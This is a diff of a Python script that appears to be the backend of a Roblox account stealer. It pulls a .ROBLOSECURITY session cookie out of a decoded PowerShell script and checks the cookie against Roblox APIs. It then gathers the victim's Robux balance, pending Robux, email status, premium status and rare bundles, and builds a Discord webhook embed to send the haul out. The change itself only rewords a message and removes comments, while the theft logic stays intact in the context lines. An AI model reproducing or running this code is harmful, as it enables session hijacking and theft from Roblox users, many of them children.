@@ -15,12 +15,11 @@ def main():
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
 
         if not webhook_url:
-            print("ERROR: DISCORD_WEBHOOK_URL environment variable is missing on Railway!")
+            print("ERROR: DISCORD_WEBHOOK_URL environment variable is missing on Render!")
             return
 
         print(f"[*] Decoded script length: {len(decoded_script)} characters")
 
-        # Extract Target URL and Action/Tool type
         uri_match = re.search(r'-Uri\s+["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
         target_url = uri_match.group(1) if uri_match else "https://www.roblox.com"
         
@@ -30,7 +29,6 @@ def main():
         elif "catalog" in target_url.lower() or "library" in target_url.lower():
             tool_used = "Asset-Utility"
 
-        # Extract .ROBLOSECURITY Cookie safely
         cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
         if not cookie_match:
             cookie_match = re.search(r'_\|WARNING:-DO-NOT-SHARE-THIS\.-[^"\']+', decoded_script)
@@ -52,7 +50,6 @@ def main():
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
         print(f"[+] Cookie extracted & sanitized! Length: {len(roblosecurity)}")
 
-        # Default fallback metrics
         username = "Unknown User"
         user_id = 0
         account_age_days = 0
@@ -71,7 +68,6 @@ def main():
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
         }
 
-        # 1. Authenticated User Profile Check
         user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
         print(f"[*] Roblox Auth API status: {user_res.status_code}")
         
@@ -81,7 +77,6 @@ def main():
             user_id = user_data.get("id")
             cookie_status = "🟢 Valid & Active"
 
-            # Detailed User Info (Account Age / Creation Date)
             detail_res = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers)
             if detail_res.status_code == 200:
                 d_json = detail_res.json()
@@ -90,35 +85,29 @@ def main():
                     created_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                     account_age_days = (datetime.now(created_date.tzinfo) - created_date).days
 
-            # Currency Balance
             curr_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
             if curr_res.status_code == 200:
                 robux_balance = curr_res.json().get("robux", 0)
 
-            # Pending Robux
             pend_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/resale-stock/pending-robux", headers=headers)
             if pend_res.status_code == 200:
                 pending_robux = pend_res.json().get("pendingRobux", 0)
 
-            # Email Verification Status
             email_res = requests.get("https://users.roblox.com/v1/email", headers=headers)
             if email_res.status_code == 200:
                 email_verified = "True" if email_res.json().get("verified", False) else "False"
 
-            # Premium Subscription Status
             prem_res = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/subscriptions", headers=headers)
             if prem_res.status_code == 200:
                 subs = prem_res.json().get("subscriptions", [])
                 is_premium = "True" if len(subs) > 0 else "False"
 
-            # Avatar Thumbnail
             thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420&height=420&format=Png&isCircular=false", headers=headers)
             if thumb_res.status_code == 200:
                 t_data = thumb_res.json().get("data", [])
                 if len(t_data) > 0:
                     avatar_thumb = t_data[0].get("imageUrl", avatar_thumb)
 
-            # Bundle Checks (Korblox ID: 192, Headless ID: 201)
             def check_bundle(bundle_id):
                 chk = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned", headers=headers)
                 if chk.status_code == 200:
@@ -128,7 +117,6 @@ def main():
             has_korblox = check_bundle(192)
             has_headless = check_bundle(201)
 
-        # Discord Rich Embed Payload styled like the reference image
         payload = {
             "username": f"{username} | 13+",
             "avatar_url": avatar_thumb,
